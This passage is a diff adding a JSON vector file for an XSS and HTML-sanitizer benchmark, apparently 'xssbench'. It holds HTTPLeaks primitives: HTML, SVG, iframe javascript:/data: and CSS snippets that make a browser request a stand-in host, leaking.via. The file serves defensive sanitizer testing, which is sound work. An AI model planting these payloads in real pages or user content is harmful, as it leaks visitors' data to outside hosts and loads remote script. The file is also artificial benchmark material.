@@ -1,0 +1,717 @@
+{
+	"schema": "xssbench.vectorfile.v1",
+	"meta": {
+		"tool": "xssbench",
+		"source_url": "https://raw.githubusercontent.com/cure53/HTTPLeaks/main/leak.html",
+		"notes": "External-request leak primitives extracted from cure53/HTTPLeaks leak.html, split by its HTML comment section markers. This pack is intentionally NOT filtered to the benchmark's shared allowlist; it is meant to establish a 'noop baseline' of which primitives trigger observable external requests in the harness.",
+		"license": {
+			"spdx": "BSD-2-Clause",
+			"url": "https://raw.githubusercontent.com/cure53/HTTPLeaks/main/LICENSE",
+			"file": "vectors/httpleaks-LICENSE.txt"
+		}
+	},
+	"vectors": [
+		{
+			"id": "httpleaks-base-check-manually-base-34da489841",
+			"description": "HTTPLeaks leak.html: Base (check manually): <base> snippet (https://leaking.via/base-href/).",
+			"payload_html": "<base href=\"https://leaking.via/base-href/\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-msie-imports-snippet-20a1298535",
+			"description": "HTTPLeaks leak.html: MSIE Imports: <snippet> snippet (https://leaking.via/import-implementation).",
+			"payload_html": "<?IMPORT namespace=\"myNS\" implementation=\"https://leaking.via/import-implementation\" ?>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-msie-imports-import-2b766c9651",
+			"description": "HTTPLeaks leak.html: MSIE Imports: <import> snippet (https://leaking.via/import-implementation-2).",
+			"payload_html": "<IMPORT namespace=\"myNS\" implementation=\"https://leaking.via/import-implementation-2\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-redirects-meta-8a3d639718",
+			"description": "HTTPLeaks leak.html: Redirects: <meta> snippet (https://leaking.via/meta-refresh).",
+			"payload_html": "<meta http-equiv=\"refresh\" content=\"10; url=https://leaking.via/meta-refresh\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-csp-meta-076500a1d4",
+			"description": "HTTPLeaks leak.html: CSP: <meta> snippet (https://leaking.via/meta-csp-report-uri).",
+			"payload_html": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'; report-uri https://leaking.via/meta-csp-report-uri\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-csp-meta-86d3e79a49",
+			"description": "HTTPLeaks leak.html: CSP: <meta> snippet (https://leaking.via/meta-csp-report-uri-2).",
+			"payload_html": "<meta http-equiv=\"Content-Security-Policy-Report-Only\" content=\"script-src 'self'; report-uri https://leaking.via/meta-csp-report-uri-2\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-reading-view-meta-8d764ec87d",
+			"description": "HTTPLeaks leak.html: Reading View: <meta> snippet (https://leaking.via/meta-name-copyright-reading-view).",
+			"payload_html": "<meta name=\"copyright\" content=\"<img src='https://leaking.via/meta-name-copyright-reading-view'>\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-reading-view-meta-d0648719a6",
+			"description": "HTTPLeaks leak.html: Reading View: <meta> snippet (https://leaking.via/meta-name-displaydate-reading-view).",
+			"payload_html": "<meta name=\"displaydate\" content=\"<img src='https://leaking.via/meta-name-displaydate-reading-view'>\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-reading-view-meta-014ed4d49a",
+			"description": "HTTPLeaks leak.html: Reading View: <meta> snippet (https://leaking.via/meta-property-reading-view).",
+			"payload_html": "<meta property=\"og:site_name\" content=\"<img src='https://leaking.via/meta-property-reading-view'>\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-applink-web-fallback-meta-a694ceea3b",
+			"description": "HTTPLeaks leak.html: AppLink Web Fallback: <meta> snippet (https://leaking.via/meta-property-al-web-url).",
+			"payload_html": "<meta property=\"al:web:url\" content=\"https://leaking.via/meta-property-al-web-url\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-7792739fd0",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-config).",
+			"payload_html": "<meta name=\"msapplication-config\" content=\"https://leaking.via/meta-name-msa-config\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-49c0adc434",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-badge).",
+			"payload_html": "<meta name=\"msapplication-badge\" content=\"frequency=30; polling-uri=https://leaking.via/meta-name-msa-badge\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-9e82f37c0e",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-notification).",
+			"payload_html": "<meta name=\"msapplication-notification\" content=\"frequency=60;polling-uri=https://leaking.via/meta-name-msa-notification\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-d2fde1e696",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-logo-1).",
+			"payload_html": "<meta name=\"msapplication-square150x150logo\" content=\"https://leaking.via/meta-name-msa-logo-1\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-698bb91ca9",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-logo-2).",
+			"payload_html": "<meta name=\"msapplication-square310x310logo\" content=\"https://leaking.via/meta-name-msa-logo-2\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-25d15e7e5a",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-logo-3).",
+			"payload_html": "<meta name=\"msapplication-square70x70logo\" content=\"https://leaking.via/meta-name-msa-logo-3\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-5d327ace78",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-logo-4).",
+			"payload_html": "<meta name=\"msapplication-wide310x150logo\" content=\"https://leaking.via/meta-name-msa-logo-4\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-9ab247e8bc",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-task;icon-uri=https://leaking.via/meta-name-msa-task-icon).",
+			"payload_html": "<meta name=\"msapplication-task\" content=\"name=Leak;action-uri=https://leaking.via/meta-name-msa-task;icon-uri=https://leaking.via/meta-name-msa-task-icon\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-pinned-websites-meta-06279cf9db",
+			"description": "HTTPLeaks leak.html: Pinned Websites: <meta> snippet (https://leaking.via/meta-name-msa-tile-image).",
+			"payload_html": "<meta name=\"msapplication-TileImage\" content=\"https://leaking.via/meta-name-msa-tile-image\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-676274ecc0",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-stylesheet).",
+			"payload_html": "<link rel=\"stylesheet\" href=\"https://leaking.via/link-stylesheet\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-6e90973d81",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-icon).",
+			"payload_html": "<link rel=\"icon\" href=\"https://leaking.via/link-icon\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-163bf13eb2",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-canonical).",
+			"payload_html": "<link rel=\"canonical\" href=\"https://leaking.via/link-canonical\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-3ebbc5440d",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-shortcut-icon).",
+			"payload_html": "<link rel=\"shortcut icon\" href=\"https://leaking.via/link-shortcut-icon\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-736e6ef41d",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-import).",
+			"payload_html": "<link rel=\"import\" href=\"https://leaking.via/link-import\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-afdb77f022",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-dns-prefetch).",
+			"payload_html": "<link rel=\"dns-prefetch\" href=\"https://leaking.via/link-dns-prefetch\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-785abcd4fa",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preconnect).",
+			"payload_html": "<link rel=\"preconnect\" href=\"https://leaking.via/link-preconnect\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-6139b10520",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-prefetch).",
+			"payload_html": "<link rel=\"prefetch\" href=\"https://leaking.via/link-prefetch\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-24b445d573",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload).",
+			"payload_html": "<link rel=\"preload\" href=\"https://leaking.via/link-preload\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-5b0a250753",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-prerender).",
+			"payload_html": "<link rel=\"prerender\" href=\"https://leaking.via/link-prerender\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-083a73d152",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-modulepreload).",
+			"payload_html": "<link rel=\"modulepreload\" href=\"https://leaking.via/link-modulepreload\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-155c8d63c4",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-as-fetch).",
+			"payload_html": "<link rel=\"preload\" as=\"fetch\" href=\"https://leaking.via/link-preload-as-fetch\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-304532fb1f",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-as-font).",
+			"payload_html": "<link rel=\"preload\" as=\"font\" href=\"https://leaking.via/link-preload-as-font\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-34fe7ae206",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-as-image).",
+			"payload_html": "<link rel=\"preload\" as=\"image\" href=\"https://leaking.via/link-preload-as-image\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-7c88c10f2d",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-imagesrcset).",
+			"payload_html": "<link rel=\"preload\" as=\"image\" imagesrcset=\",,,,,https://leaking.via/link-preload-imagesrcset\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-dc208e0efb",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-as-style).",
+			"payload_html": "<link rel=\"preload\" as=\"style\" href=\"https://leaking.via/link-preload-as-style\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-858e3f8b00",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-as-script).",
+			"payload_html": "<link rel=\"preload\" as=\"script\" href=\"https://leaking.via/link-preload-as-script\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-96fa4be900",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-preload-as-track).",
+			"payload_html": "<link rel=\"preload\" as=\"track\" href=\"https://leaking.via/link-preload-as-track\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-link-19349447b1",
+			"description": "HTTPLeaks leak.html: Links: <link> snippet (https://leaking.via/link-search).",
+			"payload_html": "<link rel=\"search\" href=\"https://leaking.via/link-search\" />",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-body-background-body-68d8bd0578",
+			"description": "HTTPLeaks leak.html: Body Background: <body> snippet (https://leaking.via/body-background).",
+			"payload_html": "<body background=\"https://leaking.via/body-background\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-maps-a-0c35f7aaad",
+			"description": "HTTPLeaks leak.html: Links & Maps: <a> snippet (https://leaking.via/a-ping).",
+			"payload_html": "<a ping=\"https://leaking.via/a-ping\" href=\"#\">You have to click me</a>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-maps-a-1019611678",
+			"description": "HTTPLeaks leak.html: Links & Maps: <a> snippet (https://leaking.via/a-attributionsrc).",
+			"payload_html": "<a attributionsrc=\"foo bar https://leaking.via/a-attributionsrc\" href=\"#\">You have to click me</a>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-maps-img-17f4a93a42",
+			"description": "HTTPLeaks leak.html: Links & Maps: <img> snippet",
+			"payload_html": "<img src=\"data:;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw\" width=\"150\" height=\"150\" usemap=\"#map\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-links-maps-map-6614e30b2f",
+			"description": "HTTPLeaks leak.html: Links & Maps: <map> snippet (https://leaking.via/area-ping).",
+			"payload_html": "<map name=\"map\">\n  <area ping=\"https://leaking.via/area-ping\" shape=\"rect\" coords=\"0,0,150,150\" href=\"#\">\n</map> ",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-table-background-table-51d819225c",
+			"description": "HTTPLeaks leak.html: Table Background: <table> snippet (https://leaking.via/table-background).",
+			"payload_html": "<table background=\"https://leaking.via/table-background\">\n    <tr>\n        <td background=\"https://leaking.via/td-background\"></td>\n    </tr>\n</table>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-671bc4004b",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet (https://leaking.via/img-src).",
+			"payload_html": "<img src=\"https://leaking.via/img-src\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-f54d71a3ec",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet (https://leaking.via/img-dynsrc).",
+			"payload_html": "<img dynsrc=\"https://leaking.via/img-dynsrc\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-c2046de720",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet (https://leaking.via/img-lowsrc).",
+			"payload_html": "<img lowsrc=\"https://leaking.via/img-lowsrc\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-a6d521da46",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet",
+			"payload_html": "<img src=\"data:image/svg+xml,<svg%20xmlns='%68ttp:%2f/www.w3.org/2000/svg'%20xmlns:xlink='%68ttp:%2f/www.w3.org/1999/xlink'><image%20xlink:hr%65f='%68ttps:%2f/leaking.via/svg-via-data'></image></svg>\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-cf9c258181",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet (https://leaking.via/img-attributionsrc).",
+			"payload_html": "<img attributionsrc=\"foo bar https://leaking.via/img-attributionsrc\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-image-01e2510943",
+			"description": "HTTPLeaks leak.html: Images: <image> snippet (https://leaking.via/image-src).",
+			"payload_html": "<image src=\"https://leaking.via/image-src\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-image-645c4adb1c",
+			"description": "HTTPLeaks leak.html: Images: <image> snippet (https://leaking.via/image-href).",
+			"payload_html": "<image href=\"https://leaking.via/image-href\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-svg-6c6fede441",
+			"description": "HTTPLeaks leak.html: Images: <svg> snippet (https://leaking.via/svg-image-href).",
+			"payload_html": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<image href=\"https://leaking.via/svg-image-href\">\n<image xlink:href=\"https://leaking.via/svg-image-xlink-href\">\n</svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-picture-b3f59a109c",
+			"description": "HTTPLeaks leak.html: Images: <picture> snippet (https://leaking.via/picture-source-srcset).",
+			"payload_html": "<picture>\n    <source srcset=\"https://leaking.via/picture-source-srcset\">\n</picture>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-picture-898e5d3a4f",
+			"description": "HTTPLeaks leak.html: Images: <picture> snippet (https://leaking.via/picture-img-srcset).",
+			"payload_html": "<picture>\n    <img srcset=\"https://leaking.via/picture-img-srcset\">\n</picture>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-36e00fc3c3",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet (https://leaking.via/img-srcset).",
+			"payload_html": "<img srcset=\",,,,,https://leaking.via/img-srcset\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-images-img-46c2c896e5",
+			"description": "HTTPLeaks leak.html: Images: <img> snippet (https://leaking.via/img-longdesc).",
+			"payload_html": "<img src=\"#\" longdesc=\"https://leaking.via/img-longdesc\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-forms-form-1b5a0c7443",
+			"description": "HTTPLeaks leak.html: Forms: <form> snippet (https://leaking.via/form-action).",
+			"payload_html": "<form action=\"https://leaking.via/form-action\"></form>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-forms-form-a64ae1f71e",
+			"description": "HTTPLeaks leak.html: Forms: <form> snippet (https://leaking.via/button-formaction).",
+			"payload_html": "<form id=\"test\"></form><button form=\"test\" formaction=\"https://leaking.via/button-formaction\">CLICKME</button>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-forms-input-12b9a6ace0",
+			"description": "HTTPLeaks leak.html: Forms: <input> snippet (https://leaking.via/input-src).",
+			"payload_html": "<input type=\"image\" src=\"https://leaking.via/input-src\" name=\"test\" value=\"test\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-forms-isindex-ffa5ef6215",
+			"description": "HTTPLeaks leak.html: Forms: <isindex> snippet (https://leaking.via/isindex-src).",
+			"payload_html": "<isindex src=\"https://leaking.via/isindex-src\" type=\"image\">",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-forms-isindex-a5719aeb04",
+			"description": "HTTPLeaks leak.html: Forms: <isindex> snippet (https://leaking.via/isindex-action).",
+			"payload_html": "<isindex action=\"https://leaking.via/isindex-action\"></isindex>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-forms-form-29dc3fce58",
+			"description": "HTTPLeaks leak.html: Forms: <form> snippet (https://leaking.via/isindex-formaction).",
+			"payload_html": "<form id=\"test2\"></form><isindex type=\"submit\" formaction=\"https://leaking.via/isindex-formaction\" form=\"test2\"></isindex>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-media-bgsound-a3af8de367",
+			"description": "HTTPLeaks leak.html: Media: <bgsound> snippet (https://leaking.via/bgsound-src).",
+			"payload_html": "<bgsound src=\"https://leaking.via/bgsound-src\"></bgsound>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-media-video-3c931d0fbe",
+			"description": "HTTPLeaks leak.html: Media: <video> snippet (https://leaking.via/video-src).",
+			"payload_html": "<video src=\"https://leaking.via/video-src\">\n  <track kind=\"subtitles\" label=\"English subtitles\" src=\"https://leaking.via/track-src\" srclang=\"en\" default></track>\n</video>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-media-video-1c7654c7c4",
+			"description": "HTTPLeaks leak.html: Media: <video> snippet (https://leaking.via/video-source-src).",
+			"payload_html": "<video controls>\n  <source src=\"https://leaking.via/video-source-src\" type=\"video/mp4\">\n</video>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-media-audio-54380ab945",
+			"description": "HTTPLeaks leak.html: Media: <audio> snippet (https://leaking.via/audio-src).",
+			"payload_html": "<audio src=\"https://leaking.via/audio-src\"></audio>\n<audio controls>\n  <source src=\"https://leaking.via/audio-source-src\" type=\"video/mp4\">\n</audio>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-media-video-9716f7b803",
+			"description": "HTTPLeaks leak.html: Media: <video> snippet (https://leaking.via/video-poster).",
+			"payload_html": "<video poster=\"https://leaking.via/video-poster\" src=\"https://leaking.via/video-poster-2\"></video>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-object-embed-object-d48a0fb3f2",
+			"description": "HTTPLeaks leak.html: Object & Embed: <object> snippet (https://leaking.via/object-data).",
+			"payload_html": "<object data=\"https://leaking.via/object-data\"></object>\n<object type=\"text/x-scriptlet\" data=\"https://leaking.via/object-data-x-scriptlet\"></object>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-object-embed-object-47cf2d64a3",
+			"description": "HTTPLeaks leak.html: Object & Embed: <object> snippet (https://leaking.via/object-movie).",
+			"payload_html": "<object movie=\"https://leaking.via/object-movie\" type=\"application/x-shockwave-flash\"></object>\n<object movie=\"https://leaking.via/object-movie\">\n    <param name=\"type\" value=\"application/x-shockwave-flash\"></param>\n</object>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-object-embed-object-b50fc26dce",
+			"description": "HTTPLeaks leak.html: Object & Embed: <object> snippet (https://leaking.via/object-codebase).",
+			"payload_html": "<object codebase=\"https://leaking.via/object-codebase\"></object>\n<embed src=\"https://leaking.via/embed-src\"></embed>\n<embed code=\"https://leaking.via/embed-code\"></embed>\n<object classid=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\">\n    <param name=\"DataURL\" value=\"https://leaking.via/object-param-dataurl\">\n</object>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-object-embed-object-4a981f8019",
+			"description": "HTTPLeaks leak.html: Object & Embed: <object> snippet (https://leaking.via/object-param-url).",
+			"payload_html": "<object classid=\"clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6\">\n    <param name=\"URL\" value=\"https://leaking.via/object-param-url\">\n</object>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-portal-portal-a16bf8d046",
+			"description": "HTTPLeaks leak.html: Portal: <portal> snippet (https://leaking.via/portal-src).",
+			"payload_html": "<portal src=\"https://leaking.via/portal-src\"></portal>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-script-script-9dc0af6d93",
+			"description": "HTTPLeaks leak.html: Script: <script> snippet (https://leaking.via/script-src).",
+			"payload_html": "<script src=\"https://leaking.via/script-src\"></script>\n<script attributionsrc=\"foo bar https://leaking.via/script-attributionsrc\"></script>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-script-svg-9e1d1b29c3",
+			"description": "HTTPLeaks leak.html: Script: <svg> snippet (https://leaking.via/svg-script-href).",
+			"payload_html": "<svg><script href=\"https://leaking.via/svg-script-href\"></script></svg>\n<svg><script xlink:href=\"https://leaking.via/svg-script-xlink-href\"></script></svg>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-script-script-2a250304e1",
+			"description": "HTTPLeaks leak.html: Script: <script> snippet (https://leaking.via/javascript-source-map).",
+			"payload_html": "<script>\n//# sourceMappingURL=https://leaking.via/javascript-source-map\n</script>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-8347d1f059",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet (https://leaking.via/iframe-src).",
+			"payload_html": "<iframe src=\"https://leaking.via/iframe-src\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-d405cfd768",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet",
+			"payload_html": "<iframe src=\"data:image/svg+xml,<svg%20xmlns='%68ttp:%2f/www.w3.org/2000/svg'%20xmlns:xlink='%68ttp:%2f/www.w3.org/1999/xlink'><image%20xlink:hr%65f='%68ttps:%2f/leaking.via/svg-via-data'></image></svg>\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-918f409ac3",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet (https://leaking.via/iframe-srcdoc-img-src).",
+			"payload_html": "<iframe srcdoc=\"<img src=https://leaking.via/iframe-srcdoc-img-src>\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-frameset-bc5ff77e17",
+			"description": "HTTPLeaks leak.html: Frames: <frameset> snippet (https://leaking.via/frame-src).",
+			"payload_html": "<frameset>\n    <frame src=\"https://leaking.via/frame-src\"></frame>\n</frameset>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-8bd86dd816",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet (https://leaking.via/iframe-src-viewsource).",
+			"payload_html": "<iframe src=\"view-source:https://leaking.via/iframe-src-viewsource\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-991af16f09",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet (https://leaking.via/iframe-javascript-src&gt;).",
+			"payload_html": "<iframe src=\"javascript:'&lt;img src=https://leaking.via/iframe-javascript-src&gt;'\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-30d7e5e616",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet (https://leaking.via/iframe-javascript-src-2&gt;\\&apos;&quot;&gt;&lt;/iframe&gt;).",
+			"payload_html": "<iframe src=\"javascript:'&lt;iframe src=&quot;javascript:\\&apos;&lt;img src=https://leaking.via/iframe-javascript-src-2&gt;\\&apos;&quot;&gt;&lt;/iframe&gt;'\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-frames-iframe-3008fa15c1",
+			"description": "HTTPLeaks leak.html: Frames: <iframe> snippet",
+			"payload_html": "<iframe src=\"javascript:atob('PGltZyBzcmM9Imh0dHBzOi8vbGVha2luZy52aWEvaWZyYW1lLWphdmFzY3JpcHQtc3JjLTMiPg==')\"></iframe>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-menu-p-3f4b6d710f",
+			"description": "HTTPLeaks leak.html: Menu: <p> snippet",
+			"payload_html": "<p contextmenu=\"a\">Right Click</p>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-menu-menu-c8a0bd51fc",
+			"description": "HTTPLeaks leak.html: Menu: <menu> snippet (https://leaking.via/menuitem-icon).",
+			"payload_html": "<menu type=\"context\" id=\"a\">\n    <menuitem label=\"a\" icon=\"https://leaking.via/menuitem-icon\"></menuitem>\n</menu>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-9689853d47",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-source-map).",
+			"payload_html": "<style>\n    /*# sourceMappingURL=https://leaking.via/css-source-map */\n</style>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-11934c9941",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-import-string).",
+			"payload_html": "<style>\n    @import 'https://leaking.via/css-import-string';\n    @import url(https://leaking.via/css-import-url);\n</style>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-c3d4ce26d0",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-after-content).",
+			"payload_html": "<style>\n    a:after {content: url(https://leaking.via/css-after-content)}\n    a::after {content: url(https://leaking.via/css-after-content-2)}\n    a:before {content: url(https://leaking.via/css-before-content)}\n    a::before {content: url(https://leaking.via/css-before-content-2)}    \n</style>\n<a href=\"#\">ABC</a>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-417bd0cffb",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-list-style).",
+			"payload_html": "<style>\n    big {\n        list-style: url(https://leaking.via/css-list-style);\n        list-style-image: url(https://leaking.via/css-list-style-image);\n        background: url(https://leaking.via/css-background);\n        background-image: url(https://leaking.via/css-background-image);\n        border-image: url(https://leaking.via/css-border-image);\n        -moz-border-image: url(https://leaking.via/css--moz-border-image-alias);\n        -webkit-border-image: url(https://leaking.via/css--webkit-border-image-alias);\n        border-image-source: url(https://leaking.via/css-border-image-source);\n        shape-outside: url(https://leaking.via/css-shape-outside);\n        -webkit-shape-outside: url(https://leaking.via/css--webkit-shape-outside-alias);\n        -webkit-mask-image: url(https://leaking.via/css--webkit-mask-image);\n        -webkit-mask-box-image: url(https://leaking.via/css--webkit-mask-box-image);\n        -webkit-mask-box-image-source: url(https://leaking.via/css--webkit-mask-box-image-source);\n        cursor: url(https://leaking.via/css-cursor), auto;\n    }\n</style>\n<big>DEF</big>",
+			"payload_context": "http_leak"
+		},
+		{
+			"id": "httpleaks-css-style-21ddfc1eab",
+			"description": "HTTPLeaks leak.html: CSS: <style> snippet (https://leaking.via/css-font-face-src).",
